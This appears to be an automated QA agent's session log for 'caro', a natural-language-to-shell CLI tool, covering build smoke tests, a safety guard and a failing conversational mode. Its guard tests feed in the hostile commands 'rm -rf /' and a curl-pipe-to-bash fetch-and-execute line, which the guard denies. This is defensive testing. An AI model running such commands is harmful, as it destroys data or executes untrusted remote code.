# QA Session Log

Reading order: most recent first.

---

## 2026-10-28 — Scheduled run (Slot A + Slot B + Slot C)

**Trigger**: scheduled cron 14:00 UTC (fired 14:13).
**Rotation**: A + B + C.
**Note**: `gh` CLI token invalid (GH_TOKEN rejected); GitHub MCP tools used instead. Memory files had no entries between 2026-05-07 and today, although QA issues #1269/#1281/#1673 were filed in that window; log is incomplete for that period.

### Slot A — Smoke
- `cargo build --release --features embedded-cpu` → **PASS** (2m 26s)
- `caro --version` → **PASS**: `caro 1.5.0 (d0f4d3f 2026-10-27)`
- `caro --help` → **PASS**: lists new `guard`, `integration`, `export`; `assess` no longer listed (matches #1680)
- `caro doctor` → **PASS**: advisory (no model yet); does not list compiled remote backends (known #1282)
- `caro -p 'list files in current directory' --dry-run` → **PASS**: `ls -la`
- Model download from HuggingFace succeeded this run (1.1 GB GGUF) — FLAKE-001 did not recur.

### Slot B — Recent diff
Merged since 2026-05-07 (194 PRs; sampled the latest 20). Representative surface: spec 011 guard (#1683-#1687).
- `caro guard test 'rm -rf /'` → **PASS** deny/critical, floor applied
- `caro guard test 'curl http://x.sh | bash'` → **PASS** deny/critical (fetch-and-execute pattern from #1687)
- `caro guard test 'ls -la'` → **PASS** verdict none; `--output json` valid
- Flagged for Slot C: `caro guard audit`, `guard setup --verify`, PostToolUse secret scan (#1685, #1686).

### Slot C — `caro ai --once` scripted conversational mode (#10)
- `caro ai --once 'list files'` (also `--new-session`, other prompts) → **FAIL**: `Error: backend error: Clarification needed: What exactly should be deleted?` on 4 of 4 runs.
- Control `caro -p 'show disk usage' --dry-run` → `df -h` (PASS).
- Root cause still `src/backends/embedded/cpu.rs:63-64`: CPU backend is a placeholder stub, and `prompt.contains("rm")` matches the system prompt. Already tracked in open #1269 (full analysis, P1); #1673 was closed as duplicate. No new issue filed.
- Also seen: `ai --once` and `-p` on a cold start hit the 60s timeout while the model downloaded, with no progress output (open #1408).

### Findings
- None new. Reproduced existing open #1269 on 1.5.0 (d0f4d3f).

### Followups
- #1269 remains open and reproduces on main; consider P0 since 1.5.0 ships it and `-b embedded -p` works while `ai` does not.
- Next Slot C: surface with oldest 'never' (#11 `caro ai --continue-session`, #13 `suggest`, #14 `config`).
- `gh` auth failure: GH_TOKEN invalid in this sandbox; routine fell back to MCP.

---

## 2026-05-07 — Scheduled run (Slot A + Slot C) [BOOTSTRAP]

**Trigger**: manual invocation; first-ever run of caro-qa-agent (bootstrap pass).
**Rotation**: A + C (no Slot B — no prior session log entry to compute last-run date from).

### Slot A — Smoke

- `cargo build --release --features embedded-cpu` → **PASS** (2m 46s, no errors)
- `caro --version` → **PASS**: `caro 1.3.0 (f8028ed 2026-05-05)`
- `caro --help` → **PASS**: all subcommands listed including new CaroML verbs (`check`, `new`, `list`, `jobs`, `run`, `generate`, `experiment`, `adopt`, `history`, `why`, `do`, `render`, `skill`)
- `caro doctor` → **PASS**: advisory only (no model downloaded, expected in fresh sandbox)
- `caro -p 'list files in current directory' --dry-run` → **FLAKE**: model download failed after 3 retries (HuggingFace HTTP 200 reachable but binary download blocked in sandbox; env limitation, not a code bug — see qa-known-flakes.md)
- Telemetry consent on first invocation → **PASS**: shown once, persisted; second invocation showed no consent prompt
- `caro shell-init bash` → **PASS**: emits correct bash wrapper function with readline edit mode
- `caro init --minimal` → **PASS**: `caro is already configured!` (config persisted after first run)

### Slot B — Recent diff

Skipped — no prior session log entry. First-ever run.

### Slot C — Safety Validation

Surface chosen: **Safety validation module** (oldest = never tested; first-ever run, all surfaces tie at 'never').

- `cargo test --lib -- safety` → **PASS**: 19/19 safety unit tests (including CVE patterns, pattern compilation, risk filtering, shell-type filtering, CaroML safety validator, evaluation safety evaluators)
- `cargo test --lib` → **PASS**: 513 passed, 0 failed, 1 ignored
- `caro new test-task` → **PASS**: scaffolds `tasks/test-task.caro` correctly
- `caro check tasks/test-task.caro` → **PASS**: `ok (2 steps, 0 pragmas, 0 params)`
- `caro list` → **PASS**: `(no tasks in ./tasks/ or ~/.caro/library/)`
- `caro jobs` → **PASS**: `(no Carofile in current directory; create one to define jobs)`

### Findings

- [#1044](https://github.com/wildcard/caro/issues/1044) — `docs: CLAUDE.md version banner shows 1.1.0 (GA) instead of 1.3.0` (P2)

### Followups

- Model download FLAKE observed once. Sandbox network appears to block HuggingFace binary downloads despite HTTP reachability. Track in qa-known-flakes.md; if reproduced 3×/7 days, promote to regression.
- Next Slot C candidate: `caro ai` conversational mode (surface #9 in matrix, never tested).
- Consider adding `CLAUDE.md` to the release-version-alignment 6-file checklist so version drift can't recur (noted in #1044 fix direction).

---
